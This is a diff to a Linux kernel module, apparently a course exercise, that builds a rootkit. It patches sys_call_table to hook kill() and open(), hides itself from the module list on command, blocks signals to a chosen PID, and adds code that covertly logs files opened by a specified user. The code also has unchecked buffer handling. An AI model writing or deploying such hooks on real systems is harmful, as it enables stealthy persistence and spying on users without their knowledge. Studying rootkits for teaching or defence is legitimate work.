@@ -16,8 +16,40 @@ void ** sctable ;
 bool hiding = false;
 struct module *current_mod;
 struct list_head *temp_module_list;
+int count = 0;
+int specified_Id = 0;
+char logfile[10][128];
 
 asmlinkage int (*orig_sys_kill)(pid_t pid, int signal) ;
+asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
+asmlinkage int m_sys_open(const char __user * filename, int flags, umode_t mode)
+{
+	char buf[256];
+	char fname[256] ;
+	int input_user = current_uid().val;
+	int i = 0;
+	copy_from_user(fname, filename, 256) ;
+	
+
+	/* TODO: */
+	if (specified_Id == input_user) {
+		if(strcmp(".", fname) != 0){
+			if(fname[0] != '/'){
+				if(count != 10){
+					strncpy(logfile[count], fname, 127);
+					count ++;
+				}else{
+					for(i = 0; i < 9; i++){
+						strncpy(logfile[i], logfile[i + 1], 127);
+					}
+					strncpy(logfile[9], fname, 127);
+				}			
+			}
+		}
+	}
+
+	return orig_sys_open(filename, flags, mode) ;
+}
 asmlinkage int m_sys_kill(pid_t pid, int signal) {
 	if(m_num == ((int) pid))
 		return -1;
@@ -36,11 +68,21 @@ int m_release(struct inode *inode, struct file *file) {
 static
 ssize_t m_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
 {
-	char buf[256] ;
+	/* TODO: */
+	char buf[256] = {'\0'};
+	char temp[256] = {'\0'};
+	
 	ssize_t toread ;
-
-//	sprintf(buf, "Hello %s from kernel!\n", m_name) ;
-	sprintf(buf, "my num is %d\n",m_num);
+	int k = 0;
+	
+	if(count == 0){
+		sprintf(buf, "there is no log\n");
+	}else{	
+		for(k = 0; k < count; k++){
+			sprintf(temp,"%d. %s\n",  k + 1, logfile[k]);
+			strcat(buf, temp);
+		}
+	}
 
 	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
 
@@ -48,6 +90,7 @@ ssize_t m_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset
 		return -EFAULT ;	
 
 	*offset = *offset + toread ;
+	
 
 	return toread ;
 }
@@ -68,20 +111,27 @@ ssize_t m_write(struct file *file, const char __user *ubuf, size_t size, loff_t 
 
 	
 	if(m_temp[0]=='o') { //on , off
-        hiding = !hiding;
+        	hiding = !hiding;
         
-        if(hiding) {
-            list_del_init(&current_mod->list);
-        } else {
-            list_add(&current_mod->list,temp_module_list);
-        }
-	} else { /*change type string as integer*/
-        int res=0;
-        int i;
-        for(i = 0; m_temp[i] != '\0'; ++i) {
-            res = res*10 +m_temp[i] - '0';
-        }
-        m_num = res;
+		if(hiding) {
+		    list_del_init(&current_mod->list);
+		} else {
+		    list_add(&current_mod->list,temp_module_list);
+		}
+	} else if(m_temp[0]=='u') { /*change type string as integer*/
+		int res = 0;
+		int i;
+		for(i = 1; m_temp[i] != '\0'; ++i) {
+		    res = res*10 +m_temp[i] - '0';
+		}
+		specified_Id = res;
+	} else { 
+		int res=0;
+		int i;
+		for(i = 0; m_temp[i] != '\0'; ++i) {
+		    res = res*10 +m_temp[i] - '0';
+		}
+		m_num = res;
 	}       /*  */
 
 	*offset = strlen(buf) ;
@@ -107,10 +157,12 @@ int __init m_init(void) {
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
 
 	orig_sys_kill = sctable[__NR_kill];
+	orig_sys_open = sctable[__NR_open];
 	pte = lookup_address((unsigned long) sctable, &level);
 	if(pte->pte &~ _PAGE_RW)
 		pte->pte |= _PAGE_RW;
 	sctable[__NR_kill] = m_sys_kill;
+	sctable[__NR_open] = m_sys_open;
 
     current_mod = &__this_module;
 	temp_module_list = current_mod->list.prev;
